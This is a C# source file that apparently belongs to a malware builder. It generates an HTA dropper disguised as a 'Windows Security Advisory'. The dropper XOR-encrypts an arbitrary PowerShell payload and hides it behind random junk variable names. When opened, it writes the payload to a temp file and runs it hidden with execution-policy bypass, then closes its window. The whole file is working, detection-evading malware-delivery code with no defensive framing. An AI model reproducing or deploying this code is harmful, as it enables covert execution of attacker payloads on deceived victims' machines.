using System.Security.Cryptography;
using System.Text;

namespace WpfApp.StubBuilders
{
    internal static class HtaStubBuilder
    {
        public static string Generate(string ps1Code)
        {
            byte[] ps1Bytes = Encoding.UTF8.GetBytes(ps1Code);

            var rng = RandomNumberGenerator.Create();
            byte[] xorKey = new byte[1];
            rng.GetBytes(xorKey);
            int key = xorKey[0] | 1;

            byte[] encrypted = new byte[ps1Bytes.Length];
            for (int i = 0; i < ps1Bytes.Length; i++)
                encrypted[i] = (byte)(ps1Bytes[i] ^ (key ^ (i & 0xFF)));

            string jsArray = string.Join(",", encrypted.Select(b => b.ToString()));

            return GenerateObfuscatedHta(jsArray, key);
        }

        internal static string GenerateObfuscatedHta(string jsPayload, int xorKey)
        {
            var rng = new Random();
            string junkStr(int len)
            {
                const string chars = "abcdefghijklmnopqrstuvwxyz";
                return new string(Enumerable.Range(0, len).Select(_ => chars[rng.Next(chars.Length)]).ToArray());
            }

            string r1 = junkStr(rng.Next(6, 12));
            string r2 = junkStr(rng.Next(6, 12));
            string r3 = junkStr(rng.Next(6, 12));
            string r4 = junkStr(rng.Next(6, 12));
            string r5 = junkStr(rng.Next(6, 12));

            var sb = new StringBuilder();
            sb.Append("var ");
            sb.Append(r1);
            sb.Append(" = ");
            sb.Append(xorKey);
            sb.Append(";\r\n");

            sb.Append("var ");
            sb.Append(r2);
            sb.Append(" = new Array(");
            sb.Append(jsPayload);
            sb.Append(");\r\n");

            sb.Append("var ");
            sb.Append(r3);
            sb.Append(" = '';\r\n");

            sb.Append("var ");
            sb.Append(r4);
            sb.Append(" = 'MSXML2.XMLHTTP';\r\n");

            sb.Append("var ");
            sb.Append(r5);
            sb.Append(" = 'WScript.Shell';\r\n");

            sb.Append("for (var i = 0; i < ");
            sb.Append(r2);
            sb.Append(".length; i++) {\r\n");
            sb.Append("  ");
            sb.Append(r2);
            sb.Append("[i] = (");
            sb.Append(r2);
            sb.Append("[i] ^ (");
            sb.Append(r1);
            sb.Append(" ^ (i & 0xFF)));\r\n");
            sb.Append("  ");
            sb.Append(r3);
            sb.Append(" += String.fromCharCode(");
            sb.Append(r2);
            sb.Append("[i]);\r\n");
            sb.Append("}\r\n");

            sb.Append("var fso = new ActiveXObject('Scripting.FileSystemObject');\r\n");
            sb.Append("var tmpFolder = fso.GetSpecialFolder(2);\r\n");
            sb.Append("var psFile = tmpFolder + '\\\\' + fso.GetTempName() + '.ps1';\r\n");
            sb.Append("var f = fso.CreateTextFile(psFile, true);\r\n");
            sb.Append("f.Write(");
            sb.Append(r3);
            sb.Append(");\r\n");
            sb.Append("f.Close();\r\n");

            sb.Append("var shell = new ActiveXObject(");
            sb.Append(r5);
            sb.Append(");\r\n");
            sb.Append("shell.Run('powershell -ep bypass -nop -w hidden -file \"' + psFile + '\"', 0, false);\r\n");
            sb.Append("window.close();");

            string scriptBlock = sb.ToString();

            string html = @"<html>
<head>
<title>Windows Security Advisory</title>
<HTA:APPLICATION
    ID=""htaApp""
    APPLICATIONNAME=""Windows Security Advisory""
    BORDER=""thin""
    BORDERSTYLE=""normal""
    CAPTION=""yes""
    ICON=""
    MAXIMIZEBUTTON=""no""
    MINIMIZEBUTTON=""yes""
    SHOWINTASKBAR=""yes""
    SINGLEINSTANCE=""no""
    SYSMENU=""yes""
    VERSION=""1.0""
    SCROLL=""no""
/>
</head>
<body>
<script>
SCRIPT_PLACEHOLDER
</script>
</body>
</html>";

            return html.Replace("SCRIPT_PLACEHOLDER", scriptBlock);
        }
    }
}
